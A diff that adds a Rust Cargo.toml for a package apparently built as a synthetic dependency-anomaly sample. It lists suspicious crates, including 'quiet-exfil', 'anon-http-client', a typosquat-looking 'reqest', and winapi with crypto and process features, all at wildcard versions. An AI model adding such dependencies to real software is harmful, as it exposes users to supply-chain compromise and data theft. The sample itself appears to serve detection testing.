@@ -1,0 +1,11 @@
+[package]
+name = "syn_depanomaly_272"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+anon-http-client = "0.0.1"
+quiet-exfil = "0.0.1"
+reqest = "*"
+winapi = { version = "*", features = ["winuser", "wincrypt", "processthreadsapi"] }
+
